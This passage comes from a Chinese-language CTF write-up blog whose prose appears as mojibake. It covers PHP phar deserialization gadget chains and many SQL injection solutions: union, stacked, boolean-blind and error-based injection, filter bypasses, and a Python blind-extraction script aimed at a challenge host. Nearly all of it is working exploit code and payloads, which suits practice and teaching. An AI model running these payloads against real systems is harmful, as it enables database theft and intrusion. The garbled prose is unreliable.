<p>åˆçœ‹åˆ°Userç±»é‡Œæœ‰ä¸€ä¸ªcloseæ–¹æ³•ï¼Œå¦‚æœ<code>db=new FileList()</code>å°±ä¼šè°ƒç”¨closeæ–¹æ³•äº†ã€‚</p>
<p>exp:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;db=<span class="keyword">new</span> <span class="title class_">FileList</span>();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files=<span class="keyword">array</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&#x27;/flag.txt&#x27;</span>));</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;results=<span class="keyword">array</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;funcs=<span class="keyword">array</span>();</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;   </span><br><span class="line">      <span class="variable language_">$this</span>-&gt;filename=<span class="variable">$name</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;test.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;text&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure>

<p>å°†ç”Ÿæˆçš„pharæ–‡ä»¶ä¸Šä¼ ï¼Œæ³¨æ„è¦æŠ“åŒ…æ”¹mimeï¼Œç„¶ååˆ é™¤ï¼Œåœ¨filenameå†™phar:&#x2F;&#x2F;test.jpg</p>
<hr>
<h4 id="SWPUCTF-2018-SimplePHP"><a href="#SWPUCTF-2018-SimplePHP" class="headerlink" title="[SWPUCTF 2018]SimplePHP"></a>[SWPUCTF 2018]SimplePHP</h4><p>&#x3D;&#x3D;pharååºåˆ—åŒ–&#x3D;&#x3D;</p>
<p>åœ¨file.phpæœ‰ä¸€ä¸ªæ˜æ˜¾çš„å‚æ•°fileï¼Œåº”è¯¥å¯ä»¥ä»»æ„æ–‡ä»¶è¯»å–ï¼Œfile&#x3D;file.phpï¼Œä¸‹è½½æºä»£ç ã€‚</p>
<p>file.php:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$show</span> = <span class="keyword">new</span> <span class="title class_">Show</span>(); <span class="comment">//å»ºç«‹å¯¹è±¡</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>)) </span><br><span class="line">&#123; </span><br><span class="line">  <span class="variable">$show</span>-&gt;source = <span class="variable">$file</span>; <span class="comment">//èµ‹å€¼</span></span><br><span class="line">  <span class="variable">$show</span>-&gt;<span class="title function_ invoke__">_show</span>(); <span class="comment">//è°ƒç”¨å‡½æ•°</span></span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$file</span>))&#123; </span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&#x27;file doesn\&#x27;t exists.&#x27;</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é‡è¦çš„æ˜¯class.php</p>
<p>popé“¾ï¼š<br>C1e4rç±»åˆ›å»ºæ—¶ï¼Œä¼šå°†ä¼ å…¥çš„å‚æ•°æœ€ç»ˆèµ‹å€¼ç»™C1e4r-&gt;testå¹¶è¾“å‡ºã€‚</p>
<p>showç±»å°†ä¼ å…¥çš„å‚æ•°fileåœ¨<code>__toString</code>çš„æ—¶å€™å¤åˆ¶ç»™contentå¹¶è¿”å›ï¼Œ<code>__toString</code>æ–¹æ³•ç”±C1e4rç±»ä¸­çš„<code>__destruct</code>è§¦å‘ã€‚</p>
<p>Testç±»ä¸­ï¼Œ<code>__get</code>é­”æœ¯æ–¹æ³•ä¼šåœ¨è°ƒç”¨ä¸å­˜åœ¨çš„å±æ€§æ—¶è§¦å‘ï¼ŒTestç±»ä¸­ä¸å­˜åœ¨sourceå±æ€§ã€‚</p>
<p><code>C1e4r::__destruct()-&gt;Show::__toString-&gt;Test::__get()</code></p>
<p>exp:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">C1e4r</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$c</span>-&gt;params[<span class="string">&#x27;source&#x27;</span>] = <span class="string">&#x27;var/www/html/f1ag.php&#x27;</span>;<span class="comment">//è¦è®¿é—®çš„æ–‡ä»¶ã€‚</span></span><br><span class="line"><span class="variable">$a</span>-&gt;str = <span class="variable">$b</span>;<span class="comment">//è§¦å‘__toString</span></span><br><span class="line"><span class="variable">$b</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>] = <span class="variable">$c</span>;<span class="comment">//æ„æˆ$c-&gt;sourceè®¿é—®Testç±»ä¸­ä¸å­˜åœ¨çš„sourceå±æ€§è§¦å‘__get</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;test.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;text&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure>

<p>å°†ç”Ÿæˆçš„pharæ–‡ä»¶ä¸Šä¼ ï¼Œè®°å¾—æŠ“åŒ…æ”¹åç¼€<code>jpg</code>ï¼Œç±»å‹<code>image/jpeg</code>.</p>
<p>ç„¶åå°±æ˜¯è¦æ‰¾åˆ°æ–‡ä»¶è·¯å¾„ï¼Œç›´æ¥åœ¨urlè®¿é—®uploadï¼Œå‘ç°æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶åå­—ï¼Œæœ€ååœ¨file.phpé¡µé¢åˆ©ç”¨pharåè®®getä¼ å‚</p>
<p><code>file.php?file=phar://upload/3fc8a9dd0fd47215edfc0d945febf41a.jpg</code></p>
<p>base64è§£ç å¾—flag</p>
<hr>
<h1 id="SQLæ³¨å…¥"><a href="#SQLæ³¨å…¥" class="headerlink" title="SQLæ³¨å…¥"></a>SQLæ³¨å…¥</h1><h4 id="æå®¢å¤§æŒ‘æˆ˜-2019-EasySQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-EasySQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL</h4><p>å…ˆéšä¾¿æ¥ä¸ªusername&#x3D;1,password&#x3D;1ï¼Œæç¤ºè´¦å·å¯†ç é”™è¯¯</p>
<p>æ‰“å¼€hackbarå¯¼å…¥urlï¼Œåœ¨passwordååŠ ä¸ªå•å¼•å·ï¼Œå‘ç°æŠ¥é”™ï¼Œå­˜åœ¨æ³¨å…¥æ¼æ´</p>
<p>password&#x3D;1â€™or 1&#x3D;1%23 è¿™é‡Œç”¨&#x3D;&#x3D;%23&#x3D;&#x3D;åšæ³¨é‡Šç¬¦ï¼Œå‘é€åä¹‹é—´å‡ºç°flag</p>
<hr>
<h4 id="å¼ºç½‘æ¯-2019-éšä¾¿æ³¨"><a href="#å¼ºç½‘æ¯-2019-éšä¾¿æ³¨" class="headerlink" title="[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨"></a>[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨</h4><p>æœ¬é¢˜ä¸º&#x3D;&#x3D;å †å æ³¨å…¥&#x3D;&#x3D;</p>
<p>1â€™;show tables;â€“+	å‘ç°ä¸¤ä¸ªè¡¨1919810931114514å’Œwords</p>
<p>1â€™;select * from 1919810931114514;â€“+	ç›´æ¥æŸ¥è¯¢ï¼Œå‘ç°select|update|delete|drop|insert|whereè¢«è¿‡æ»¤äº†</p>
<p>1â€™;show columns from <code>words</code>;â€“+	</p>
<p>1â€™;show columns from <code>1919810931114514</code>;â€“+	 çŒœæµ‹è¿™é‡Œçš„è¾“å…¥æ¡†æŸ¥è¯¢çš„æ˜¯wordsè¡¨å¯¹åº”idçš„å­—æ®µï¼Œä¸å¹¸çš„æ˜¯flagåœ¨1919810931114514è¡¨é‡Œã€‚å¯ä»¥å…ˆæŠŠwordsè¡¨æ”¹åä¸ºå…¶ä»–çš„ï¼Œç„¶åå°†1919810931114514æ”¹åä¸ºwordsï¼Œå°±å¯ä»¥æŸ¥è¯¢flagäº†ï¼</p>
<p>1â€™;rename table <code>words</code> to words2;  rename table <code>1919810931114514</code> to <code>words</code>;alter table words change flag id varchar(100);â€“+</p>
<p>ç„¶åä¸‡èƒ½å¯†ç æŸ¥è¯¢ï¼š</p>
<p>1â€™or 1&#x3D;1;â€“+</p>
<hr>
<h4 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h4><p>æœ¬é¢˜ä¸»è¦æ˜¯&#x3D;&#x3D;çŒœè§£åå°sqlæŸ¥è¯¢è¯­å¥&#x3D;&#x3D;</p>
<p>é€šè¿‡è¾“å…¥éé›¶æ•°å­—å¾—åˆ°çš„å›æ˜¾1å’Œè¾“å…¥å…¶ä½™å­—ç¬¦å¾—ä¸åˆ°å›æ˜¾æ¥åˆ¤æ–­å‡ºå†…éƒ¨çš„æŸ¥è¯¢è¯­å¥å¯èƒ½å­˜åœ¨æœ‰||ï¼Œä¹Ÿå°±æ˜¯select è¾“å…¥çš„æ•°æ®||å†…ç½®çš„ä¸€ä¸ªåˆ—å from è¡¨åï¼Œè¿›ä¸€æ­¥è¿›è¡ŒçŒœæµ‹å³ä¸ºselect postè¿›å»çš„æ•°æ®||flag from Flag(å«æœ‰æ•°æ®çš„è¡¨åï¼Œé€šè¿‡&#x3D;&#x3D;å †å æ³¨å…¥&#x3D;&#x3D;å¯çŸ¥)ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ­¤æ—¶çš„||èµ·åˆ°çš„ä½œç”¨æ˜¯orçš„ä½œç”¨</p>
<p>è§£æ³•ï¼š</p>
<p>è¾“å…¥çš„å†…å®¹ä¸º *,1<br>å†…ç½®çš„sqlè¯­å¥ä¸ºsql &#x3D; â€œselectâ€.post[â€˜queryâ€™].â€||flag from Flagâ€;<br>å¦‚æœ$post[â€˜queryâ€™]çš„æ•°æ®ä¸º *,1ï¼Œsqlè¯­å¥å°±å˜æˆäº†select *,1||flag from Flagï¼Œä¹Ÿå°±æ˜¯select *,1 from Flagï¼Œä¹Ÿå°±æ˜¯ç›´æ¥æŸ¥è¯¢å‡ºäº†Flagè¡¨ä¸­çš„æ‰€æœ‰å†…å®¹</p>
<hr>
<h4 id="æå®¢å¤§æŒ‘æˆ˜-2019-LoveSQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-LoveSQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL</h4><p>&#x3D;&#x3D;æœ‰å›æ˜¾çš„æŸ¥è¯¢&#x3D;&#x3D;</p>
<p>é¦–å…ˆç”¨username&#x3D;1,password&#x3D;1ä¸Šä¼ ï¼Œå‘ç°æ˜¯get ä¼ å‚ï¼Œæ‰“å¼€hackbar</p>
<p>?username&#x3D;1â€™or 1&#x3D;1%23&amp;password&#x3D;1	ä¸‡èƒ½å¯†ç ç™»å½•</p>
<p>?username&#x3D;1â€™order by 3%23&amp;password&#x3D;1	order by æŸ¥åˆ—ï¼Œæœ‰ä¸‰åˆ—</p>
<p>?username&#x3D;1â€™union select 1,2,3%23&amp;password&#x3D;1	æœ‰å›æ˜¾2,3</p>
<p>?username&#x3D;1â€™union select 1,2,database()%23&amp;password&#x3D;1	æŸ¥æ•°æ®åº“</p>
<p>?username&#x3D;1â€™union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;â€™geekâ€™)%23&amp;password&#x3D;1	æŸ¥è¡¨</p>
<p>?username&#x3D;1â€™union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;â€™l0ve1ysq1â€™)%23&amp;password&#x3D;1	æŸ¥å­—æ®µ</p>
<p>?username&#x3D;1â€™union select 1,(select group_concat(username) from l0ve1ysq1),(select group_concat(password) from l0ve1ysq1)%23&amp;password&#x3D;1	æŸ¥å€¼ï¼ˆé¡µé¢çœ‹ä¸æ¸…ï¼ŒæŸ¥çœ‹ç½‘é¡µæºä»£ç å³å¯ï¼‰</p>
<hr>
<h4 id="æå®¢å¤§æŒ‘æˆ˜-2019-BabySQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-BabySQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL</h4><p>&#x3D;&#x3D;å¸ƒå°”ç›²æ³¨&#x3D;&#x3D;</p>
<p>é¦–å…ˆç”¨username&#x3D;1,password&#x3D;1ä¸Šä¼ ï¼Œå‘ç°æ˜¯get ä¼ å‚ï¼Œæ‰“å¼€hackbar</p>
<p>æ— æ³•ä½¿ç”¨ä¸‡èƒ½å¯†ç ç™»å½•ï¼Œè¿™é‡Œç”¨	?username&#x3D;1â€™%23&amp;password&#x3D;1	ç›´æ¥å°†passwordæ³¨é‡Š</p>
<p>?username&#x3D;1â€™oorrder bbyy 3%23&amp;password&#x3D;1	orderby æŸ¥åˆ—ï¼Œè¿™é‡Œè¿‡æ»¤äº†orå’Œby,åŒå†™å³å¯ç»•è¿‡</p>
<p>ç”¨union select ä¹‹åæ²¡æœ‰å›æ˜¾ï¼Œè¿™é‡Œä½¿ç”¨bp çˆ†ç ´çš„æ–¹æ³•</p>
<p>?username&#x3D;adminâ€™anandd left((database()),1)&#x3D;â€™gâ€™%23&amp;password&#x3D;1	å¾—åˆ°æ•°æ®åº“åä¸ºgeek</p>
<p>åŒç†å¯å¾—è¡¨åb4bsqlã€geekï¼Œflagåœ¨b4bsqlé‡Œ</p>
<p>?username&#x3D;adminâ€™anandd left((selselectect passwoorrd frofromm geek.b4bsql limit 7,1),1)&#x3D;â€™fâ€™%23&amp;password&#x3D;1	çˆ†ç ´å¯å¾—flag</p>
<hr>
<h4 id="æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL</h4><p>&#x3D;&#x3D;æŠ¥é”™æ³¨å…¥&#x3D;&#x3D;</p>
<p>1ï¼šç©ºæ ¼è¢«è¿‡æ»¤å¯ä»¥ä½¿ç”¨&#x2F;**&#x2F;æˆ–è€…()ç»•è¿‡<br>2ï¼š&#x3D;å·è¢«è¿‡æ»¤å¯ä»¥ç”¨likeæ¥ç»•è¿‡<br>3ï¼šsubstringä¸midè¢«è¿‡æ»¤å¯ä»¥ç”¨rightä¸leftæ¥ç»•è¿‡</p>
<p>é¦–å…ˆç”¨username&#x3D;1,password&#x3D;1ä¸Šä¼ ï¼Œå‘ç°æ˜¯get ä¼ å‚ï¼Œæ‰“å¼€hackbar</p>
<p>è¿™é‡Œè¿‡æ»¤äº†ç©ºæ ¼ï¼Œç”¨()ç»•è¿‡</p>
<p>?username&#x3D;1â€™or(updatexml(1,concat(0x7e,(database())),0x7e))%23&amp;password&#x3D;1	çˆ†åº“ågeek</p>
<p>?username&#x3D;1â€™or(updatexml(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema)like(â€˜geekâ€™)),0x7e),1))%23&amp;password&#x3D;1	çˆ†è¡¨åH4rDsq1</p>
<p>?username&#x3D;1â€™or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(â€œH4rDsq1â€)),0x7e),1))%23&amp;password&#x3D;1	çˆ†å­—æ®µid,username,password</p>
<p>?username&#x3D;1â€™or(updatexml(1,concat(0x7e,(select(group_concat(password))from(geek.H4rDsq1)),0x7e),1))%23&amp;password&#x3D;1	çˆ†flagå·¦åŠè¾¹</p>
<p>?username&#x3D;1â€™or(updatexml(1,concat(0x7e,(select(right(password,35))from(geek.H4rDsq1)),0x7e),1))%23&amp;password&#x3D;1	çˆ†flagå³è¾¹</p>
<p>æ‹¼æ¥å³å¯æ‹¿åˆ°flag</p>
<hr>
<h4 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h4><p>æŠ“åŒ…å‘ç°äº†ä¸€ä¸²ç¥ç§˜å­—ç¬¦MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5</p>
<p>base32è§£ç ï¼šc2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw&#x3D;&#x3D;</p>
<p>base64è§£ç ï¼šselect * from user where username &#x3D; â€˜$nameâ€™</p>
<p>fuzzå‘ç°è¿‡æ»¤çš„å­—ç¬¦</p>
<p>name&#x3D;1â€™Order by 3#&amp;pw&#x3D;1	å¤§å°å†™ç»•è¿‡orderï¼ŒæŸ¥åˆ—</p>
<p><code>æœ¬é¢˜è€ƒç‚¹</code>ï¼š&#x3D;&#x3D;è”åˆæŸ¥è¯¢&#x3D;&#x3D;æ‰€æŸ¥è¯¢çš„æ•°æ®ä¸å­˜åœ¨æ—¶ï¼Œè”åˆæŸ¥è¯¢ä¼šæ„é€ ä¸€ä¸ªè™šæ‹Ÿçš„æ•°æ®</p>
<p>name&#x3D;1â€™union select 1,â€™adminâ€™,â€™c4ca4238a0b923820dcc509a6f75849bâ€™#&amp;pw&#x3D;1</p>
<hr>
<h4 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h4><p>å’Œå¼ºç½‘æ¯é‚£é¢˜å¾ˆåƒï¼Œä½†æ˜¯è¿‡æ»¤äº†å…³é”®çš„renameï¼Œè¿™é‡Œç”¨handler</p>
<p>?inject&#x3D;1â€™;handler FlagHere open;handler FlagHere read first;handler FlagHere close;#</p>
<p>mysqlé™¤å¯ä½¿ç”¨selectæŸ¥è¯¢è¡¨ä¸­çš„æ•°æ®ï¼Œä¹Ÿå¯ä½¿ç”¨handlerè¯­å¥ï¼Œè¿™æ¡è¯­å¥ä½¿æˆ‘ä»¬èƒ½å¤Ÿä¸€è¡Œä¸€è¡Œçš„æµè§ˆä¸€ä¸ªè¡¨ä¸­çš„æ•°æ®ï¼Œä¸è¿‡handlerè¯­å¥å¹¶ä¸å…·å¤‡selectè¯­å¥çš„æ‰€æœ‰åŠŸèƒ½ã€‚å®ƒæ˜¯mysqlä¸“ç”¨çš„è¯­å¥ï¼Œå¹¶æ²¡æœ‰åŒ…å«åˆ°SQLæ ‡å‡†ä¸­ã€‚</p>
<hr>
<h4 id="CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World"></a>[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World</h4><p>å¸ƒå°”ç›²æ³¨+è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://8978ccf7-1a80-456a-8679-c416322d2b1d.node4.buuoj.cn:81/index.php&quot;</span></span><br><span class="line">temp = &#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;0&quot;</span>&#125;</span><br><span class="line">re1 = <span class="built_in">len</span>(requests.post(url, data=temp).text)</span><br><span class="line"><span class="built_in">print</span>(re1)</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">45</span>,<span class="number">126</span>):</span><br><span class="line">        temp[<span class="string">&quot;id&quot;</span>] = <span class="string">&quot;1^(ascii(substr((select(flag)from(flag)),&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;,1))=&quot;</span> + <span class="built_in">str</span>(j) +<span class="string">&quot;)&quot;</span></span><br><span class="line">        re = <span class="built_in">len</span>(requests.post(url, data=temp).text)</span><br><span class="line">        <span class="keyword">if</span> re == re1:</span><br><span class="line">            flag = flag + <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<hr>
<h4 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h4><p>æ³¨å†Œä¸€ä¸ªè´¦å·ï¼Œå‘ä¸ªå¹¿å‘Šï¼Œåœ¨å¹¿å‘Šåå­—å‡ºæœ‰sqlæ³¨å…¥ã€‚</p>
<p>è¿‡æ»¤äº†or,â€“+,#ï¼Œè¿™é‡Œç”¨ <code>&#39;</code>ç»•è¿‡ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27;</span><br></pre></td></tr></table></figure>

<p> æµ‹è¯•å‘ç°æœ‰22åˆ—</p>
<p>åœ¨2,3ä½ç½®å›æ˜¾</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;union/**/select/**/1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27;</span><br></pre></td></tr></table></figure>

<p>æ•°æ®åº“web1</p>
<p>æ¥ä¸‹æ¥æŸ¥è¡¨</p>
<p>è¿™é‡Œæ²¡æœ‰åŠæ³•ä½¿ç”¨information_schema, åªèƒ½æ¢ç”¨åˆ«çš„è¡¨ã€‚è¿˜æœ‰å¦ä¸€ä¸ªè¡¨<strong>mysql.innodb_table_stats</strong>å¯ä»¥çœ‹è¡¨åã€æ•°æ®åº“åï¼Œå°±æ˜¯æ²¡æœ‰åˆ—åã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27;</span><br></pre></td></tr></table></figure>

<p>ç„¶åæŸ¥åˆ—ï¼Œä½†æ˜¯mysql.innodb_table_statsä¸èƒ½æŸ¥åˆ—åï¼Œè¿™é‡Œç”¨&#x3D;&#x3D;æ— åˆ—åæ³¨å…¥&#x3D;&#x3D;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;/**/union/**/select/**/1,(select/**/group_concat(b)/**/from/**/(select/**/1,2/**/as/**/b,3/**/union/**/select/**/*/**/from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27;</span><br></pre></td></tr></table></figure>

<p>ç„¶åçœ‹flag</p>
